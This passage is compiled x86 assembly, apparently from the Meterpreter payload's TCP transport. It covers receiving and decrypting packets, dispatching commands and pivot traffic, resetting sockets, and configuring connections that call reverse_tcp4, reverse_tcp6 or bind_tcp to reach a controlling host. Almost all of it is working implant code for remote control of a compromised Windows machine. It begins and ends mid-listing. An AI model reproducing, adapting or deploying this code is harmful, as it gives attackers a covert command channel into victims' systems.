	movl	$28, 8(%esp)
	movl	%eax, 4(%esp)
	leal	-124(%ebp), %eax
	movl	%eax, (%esp)
	call	_xor_bytes
	leal	-124(%ebp), %eax
	movl	%eax, -60(%ebp)
	movl	-60(%ebp), %eax
	addl	$31, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-60(%ebp), %eax
	addl	$30, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65676(%ebp)
	movl	-60(%ebp), %eax
	addl	$29, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65680(%ebp)
	movl	-60(%ebp), %eax
	addl	$28, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65684(%ebp)
	movl	-60(%ebp), %eax
	addl	$27, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65688(%ebp)
	movl	-60(%ebp), %eax
	addl	$26, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65692(%ebp)
	movl	-60(%ebp), %eax
	addl	$25, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65696(%ebp)
	movl	-60(%ebp), %eax
	addl	$24, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65700(%ebp)
	movl	-60(%ebp), %eax
	addl	$23, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65704(%ebp)
	movl	-60(%ebp), %eax
	addl	$22, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65708(%ebp)
	movl	-60(%ebp), %eax
	addl	$21, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65712(%ebp)
	movl	-60(%ebp), %eax
	addl	$20, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65716(%ebp)
	movl	-60(%ebp), %eax
	addl	$19, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65720(%ebp)
	movl	-60(%ebp), %eax
	addl	$18, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65724(%ebp)
	movl	-60(%ebp), %eax
	addl	$17, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65728(%ebp)
	movl	-60(%ebp), %eax
	addl	$16, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65732(%ebp)
	movl	-60(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65736(%ebp)
	movl	-60(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65740(%ebp)
	movl	-60(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65744(%ebp)
	movl	-60(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65748(%ebp)
	movl	-60(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65752(%ebp)
	movl	-60(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65756(%ebp)
	movl	-60(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65760(%ebp)
	movl	-60(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65764(%ebp)
	movl	-60(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65768(%ebp)
	movl	-60(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65772(%ebp)
	movl	-60(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-60(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-60(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-60(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-60(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65776(%ebp)
	movl	-60(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 128(%esp)
	movl	-65676(%ebp), %edx
	movl	%edx, 124(%esp)
	movl	-65680(%ebp), %edx
	movl	%edx, 120(%esp)
	movl	-65684(%ebp), %edx
	movl	%edx, 116(%esp)
	movl	-65688(%ebp), %edx
	movl	%edx, 112(%esp)
	movl	-65692(%ebp), %edx
	movl	%edx, 108(%esp)
	movl	-65696(%ebp), %edx
	movl	%edx, 104(%esp)
	movl	-65700(%ebp), %edx
	movl	%edx, 100(%esp)
	movl	-65704(%ebp), %edx
	movl	%edx, 96(%esp)
	movl	-65708(%ebp), %edx
	movl	%edx, 92(%esp)
	movl	-65712(%ebp), %edx
	movl	%edx, 88(%esp)
	movl	-65716(%ebp), %edx
	movl	%edx, 84(%esp)
	movl	-65720(%ebp), %edx
	movl	%edx, 80(%esp)
	movl	-65724(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-65728(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-65732(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-65736(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-65740(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-65744(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-65748(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-65752(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-65756(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-65760(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-65764(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-65768(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-65772(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-65776(%ebp), %edi
	movl	%edi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC11, (%esp)
	call	_real_dprintf
	movl	-100(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__ntohl@4, %eax
	call	*%eax
	subl	$4, %esp
	subl	$8, %eax
	movl	%eax, -64(%ebp)
	movl	-64(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC14, (%esp)
	call	_real_dprintf
	movl	-64(%ebp), %eax
	addl	$32, %eax
	movl	%eax, -68(%ebp)
	movl	-68(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC15, (%esp)
	call	_real_dprintf
	movl	-64(%ebp), %eax
	movl	%eax, -32(%ebp)
	movl	-68(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -40(%ebp)
	cmpl	$0, -40(%ebp)
	jne	L70
	movl	$LC16, (%esp)
	call	_real_dprintf
	movl	$8, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L59
L70:
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC17, (%esp)
	call	_real_dprintf
	movl	$32, 12(%esp)
	leal	-65660(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$32, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	-40(%ebp), %eax
	addl	$32, %eax
	movl	%eax, -72(%ebp)
	jmp	L72
L76:
	movl	-32(%ebp), %edx
	movl	-64(%ebp), %eax
	subl	-32(%ebp), %eax
	movl	%eax, %ecx
	movl	-72(%ebp), %eax
	addl	%eax, %ecx
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -80(%ebp)
	cmpl	$0, -80(%ebp)
	jg	L73
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	cmpl	$10035, %eax
	jne	L74
	jmp	L72
L74:
	cmpl	$0, -80(%ebp)
	jns	L86
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L86
L73:
	movl	-80(%ebp), %eax
	subl	%eax, -32(%ebp)
L72:
	cmpl	$0, -32(%ebp)
	jne	L76
	cmpl	$0, -32(%ebp)
	je	L77
	movl	$LC18, (%esp)
	call	_real_dprintf
	jmp	L59
L77:
	leal	-124(%ebp), %eax
	addl	$4, %eax
	movl	%eax, -60(%ebp)
	movl	-60(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-60(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65676(%ebp)
	movl	-60(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65680(%ebp)
	movl	-60(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65684(%ebp)
	movl	-60(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65688(%ebp)
	movl	-60(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65692(%ebp)
	movl	-60(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -65696(%ebp)
	movl	-60(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -65700(%ebp)
	movl	-60(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -65704(%ebp)
	movl	-60(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -65708(%ebp)
	movl	-60(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-60(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-60(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-60(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-60(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -65712(%ebp)
	movl	-60(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 64(%esp)
	movl	-65676(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-65680(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-65684(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-65688(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-65692(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-65696(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-65700(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-65704(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-65708(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-65712(%ebp), %esi
	movl	%esi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC19, (%esp)
	call	_real_dprintf
	leal	-124(%ebp), %eax
	addl	$4, %eax
	movl	%eax, (%esp)
	call	_is_null_guid
	testl	%eax, %eax
	jne	L78
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$32, %eax
	movl	$16, 8(%esp)
	leal	-124(%ebp), %edx
	addl	$4, %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcmp
	testl	%eax, %eax
	jne	L79
L78:
	movl	$LC20, (%esp)
	call	_real_dprintf
	movl	-68(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_decrypt_packet
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L59
L79:
	movl	$LC21, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	80(%eax), %eax
	leal	-124(%ebp), %edx
	addl	$4, %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_find
	movl	%eax, -76(%ebp)
	cmpl	$0, -76(%ebp)
	je	L81
	movl	$LC22, (%esp)
	call	_real_dprintf
	movl	-68(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-76(%ebp), %eax
	movl	%eax, (%esp)
	call	_pivot_packet_dispatch
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, -40(%ebp)
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	jmp	L59
L81:
	movl	$LC23, (%esp)
	call	_real_dprintf
	jmp	L59
L85:
	nop
	jmp	L59
L86:
	nop
L59:
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -92(%ebp)
	movl	$LC24, (%esp)
	call	_real_dprintf
	cmpl	$0, -40(%ebp)
	je	L82
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -40(%ebp)
L82:
	cmpl	$0, -92(%ebp)
	je	L83
	cmpl	$0, -48(%ebp)
	je	L83
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -48(%ebp)
L83:
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	$LC25, (%esp)
	call	_real_dprintf
	movl	-92(%ebp), %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC26:
	.ascii "[DISPATCH] entering server_dispatch( 0x%08X )\0"
	.align 4
LC27:
	.ascii "[DISPATCH] server dispatch thread signaled to terminate...\0"
	.align 4
LC28:
	.ascii "[DISPATCH] packet_receive returned %d, exiting dispatcher...\0"
	.align 4
LC29:
	.ascii "[DISPATCH] No packet received, probably just metsrv being ignored or a pivot packet being handled.\0"
LC30:
	.ascii "continue\0"
LC31:
	.ascii "stop\0"
	.align 4
LC32:
	.ascii "[DISPATCH] command_process result: %s\0"
LC33:
	.ascii "[DISPATCH] session has ended\0"
	.align 4
LC34:
	.ascii "[DISPATCH] communications has timed out\0"
	.align 4
LC35:
	.ascii "[DISPATCH] server_socket_poll returned %d, exiting dispatcher...\0"
	.align 4
LC36:
	.ascii "[DISPATCH] leaving server_dispatch.\0"
	.text
	.def	_server_dispatch_tcp;	.scl	3;	.type	32;	.endef
_server_dispatch_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -24(%ebp)
	movl	$1, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -28(%ebp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC26, (%esp)
	call	_real_dprintf
	call	_current_unix_timestamp
	movl	%eax, -20(%ebp)
	jmp	L88
L99:
	movl	12(%ebp), %eax
	movl	8(%eax), %eax
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_event_poll
	testl	%eax, %eax
	je	L89
	movl	$LC27, (%esp)
	call	_real_dprintf
	jmp	L90
L89:
	movl	$50000, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_server_socket_poll
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jle	L91
	leal	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_receive
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L92
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC28, (%esp)
	call	_real_dprintf
	jmp	L90
L92:
	movl	-36(%ebp), %eax
	testl	%eax, %eax
	jne	L93
	movl	$LC29, (%esp)
	call	_real_dprintf
	jmp	L94
L93:
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_command_handle
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L95
	movl	$LC30, %eax
	jmp	L96
L95:
	movl	$LC31, %eax
L96:
	movl	%eax, 4(%esp)
	movl	$LC32, (%esp)
	call	_real_dprintf
L94:
	call	_current_unix_timestamp
	movl	%eax, -20(%ebp)
	jmp	L88
L91:
	cmpl	$0, -16(%ebp)
	jne	L97
	call	_current_unix_timestamp
	movl	%eax, -32(%ebp)
	movl	8(%ebp), %eax
	movl	72(%eax), %eax
	cmpl	%eax, -32(%ebp)
	jle	L98
	movl	$0, -16(%ebp)
	movl	$LC33, (%esp)
	call	_real_dprintf
	jmp	L90
L98:
	movl	-32(%ebp), %eax
	subl	-20(%ebp), %eax
	movl	%eax, %edx
	movl	-24(%ebp), %eax
	movl	52(%eax), %eax
	cmpl	%eax, %edx
	jle	L88
	movl	$5035, -16(%ebp)
	movl	$LC34, (%esp)
	call	_real_dprintf
	jmp	L90
L97:
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC35, (%esp)
	call	_real_dprintf
	jmp	L90
L88:
	cmpl	$0, -12(%ebp)
	jne	L99
L90:
	movl	$LC36, (%esp)
	call	_real_dprintf
	movl	-16(%ebp), %eax
	leave
	ret
	.def	_transport_get_handle_tcp;	.scl	3;	.type	32;	.endef
_transport_get_handle_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	cmpl	$0, 8(%ebp)
	je	L102
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L102
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	(%eax), %eax
	jmp	L103
L102:
	movl	$0, %eax
L103:
	popl	%ebp
	ret
	.def	_transport_set_handle_tcp;	.scl	3;	.type	32;	.endef
_transport_set_handle_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	cmpl	$0, 8(%ebp)
	je	L106
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L106
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%eax)
L106:
	nop
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC37:
	.ascii "[TRANS TCP] Destroying tcp transport for url %S\0"
	.text
	.def	_transport_destroy_tcp;	.scl	3;	.type	32;	.endef
_transport_destroy_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	cmpl	$0, 8(%ebp)
	je	L111
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L111
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC37, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	testl	%eax, %eax
	je	L109
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 44(%eax)
L109:
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	testl	%eax, %eax
	je	L110
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	8(%ebp), %eax
	movl	$0, 48(%eax)
L110:
	cmpl	$0, 8(%ebp)
	je	L111
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, 8(%ebp)
L111:
	nop
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC38:
	.ascii "[TCP] waiting for disconnect from remote\0"
	.align 4
LC39:
	.ascii "[TCP] disconnect received, cleaning up\0"
	.text
	.globl	_cleanup_socket@4
	.def	_cleanup_socket@4;	.scl	2;	.type	32;	.endef
_cleanup_socket@4:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	$LC38, (%esp)
	call	_real_dprintf
	jmp	L113
L115:
	cmpl	$0, -16(%ebp)
	jle	L117
L113:
	movl	$0, 12(%esp)
	movl	$4, 8(%esp)
	leal	-20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__recv@16, %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L115
	jmp	L114
L117:
	nop
L114:
	movl	$LC39, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_thread_destroy
	movl	$0, %eax
	leave
	ret	$4
	.section .rdata,"dr"
	.align 4
LC40:
	.ascii "[TCP] Resetting transport from %u\0"
	.align 4
LC41:
	.ascii "[TCP] Transport is shutting down\0"
	.align 4
LC42:
	.ascii "[TCP] It should now be safe to close the socket.\0"
	.align 4
LC43:
	.ascii "[TCP] Transport 0x%p is now reset to %u\0"
	.text
	.def	_transport_reset_tcp;	.scl	3;	.type	32;	.endef
_transport_reset_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	cmpl	$0, 8(%ebp)
	je	L122
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L122
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC40, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L120
	cmpl	$0, 12(%ebp)
	je	L121
	movl	$LC41, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, (%esp)
	movl	__imp__closesocket@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L120
L121:
	movl	$LC42, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$_cleanup_socket@4, (%esp)
	call	_thread_create
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_thread_run
L120:
	movl	-12(%ebp), %eax
	movl	$0, (%eax)
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC43, (%esp)
	call	_real_dprintf
L122:
	nop
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC44:
	.ascii "[TCP] Connection already running on %u\0"
LC45:
	.ascii "[TCP CONFIGURE] Url: %S\0"
LC46:
	.ascii "tcp\0"
LC47:
	.ascii "//\0"
	.align 4
LC48:
	.ascii "[STAGELESS] IPv6 host %s port %S scopeid %S\0"
LC49:
	.ascii "[STAGELESS] IPv4 bind port %s\0"
	.align 4
LC50:
	.ascii "[STAGELESS] IPv4 host %s port %s\0"
	.align 4
LC51:
	.ascii "[SERVER] Something went wrong %u\0"
	.align 4
LC52:
	.ascii "[SERVER] Looking good, FORWARD!\0"
	.text
	.def	_configure_tcp_connection;	.scl	3;	.type	32;	.endef
_configure_tcp_connection:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$588, %esp
	movl	$0, -28(%ebp)
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L124
	movl	-32(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC44, (%esp)
	call	_real_dprintf
	jmp	L125
L124:
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	$511, 16(%esp)
	movl	%eax, 12(%esp)
	movl	$512, 8(%esp)
	leal	-564(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-52(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__wcstombs_s, %eax
	call	*%eax
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC45, (%esp)
	call	_real_dprintf
	call	_current_unix_timestamp
	movl	8(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	$3, 8(%esp)
	movl	$LC46, 4(%esp)
	leal	-564(%ebp), %eax
	movl	%eax, (%esp)
	call	_strncmp
	testl	%eax, %eax
	jne	L125
	movl	$LC47, 4(%esp)
	leal	-564(%ebp), %eax
	movl	%eax, (%esp)
	call	_strstr
	addl	$2, %eax
	movl	%eax, -36(%ebp)
	movl	$58, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_strrchr
	addl	$1, %eax
	movl	%eax, -40(%ebp)
	movzbl	-561(%ebp), %eax
	cmpb	$54, %al
	jne	L126
	movl	$63, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_strrchr
	addl	$1, %eax
	movl	%eax, -48(%ebp)
	movl	-48(%ebp), %eax
	subl	$1, %eax
	movb	$0, (%eax)
	movl	-40(%ebp), %eax
	subl	$1, %eax
	movb	$0, (%eax)
	movl	-48(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC48, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %edi
	movl	8(%ebp), %eax
	movl	60(%eax), %esi
	movl	8(%ebp), %eax
	movl	56(%eax), %ebx
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_atol
	movl	%edi, 20(%esp)
	movl	%esi, 16(%esp)
	movl	%ebx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_reverse_tcp6
	movl	%eax, -28(%ebp)
	jmp	L125
L126:
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_atoi
	movw	%ax, -42(%ebp)
	movl	-36(%ebp), %eax
	movzbl	(%eax), %eax
	cmpb	$58, %al
	jne	L127
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC49, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %edx
	movzwl	-42(%ebp), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_bind_tcp
	movl	%eax, -28(%ebp)
	jmp	L125
L127:
	movl	-40(%ebp), %eax
	subl	$1, %eax
	movb	$0, (%eax)
	movl	-40(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC50, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %ebx
	movl	8(%ebp), %eax
	movl	60(%eax), %ecx
	movl	8(%ebp), %eax
	movl	56(%eax), %edx
	movzwl	-42(%ebp), %eax
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-36(%ebp), %eax
	movl	%eax, (%esp)
	call	_reverse_tcp4
	movl	%eax, -28(%ebp)
L125:
	cmpl	$0, -28(%ebp)
	je	L128
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC51, (%esp)
	call	_real_dprintf
	jmp	L129
L128:
	movl	$LC52, (%esp)
	call	_real_dprintf
	movl	-32(%ebp), %eax
	movl	(%eax), %eax
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__SetHandleInformation@12, %eax
	call	*%eax
	subl	$12, %esp
	call	_current_unix_timestamp
	movl	8(%ebp), %edx
	movl	%eax, 64(%edx)
L129:
	movl	-28(%ebp), %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.section .rdata,"dr"
	.align 4
LC53:
	.ascii "[PACKET] transmit packet failed with return %d at index %d\12\0"
LC54:
	.ascii "[PACKET] Packet sent!\0"
	.text
	.globl	_packet_transmit_tcp
	.def	_packet_transmit_tcp;	.scl	2;	.type	32;	.endef
_packet_transmit_tcp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
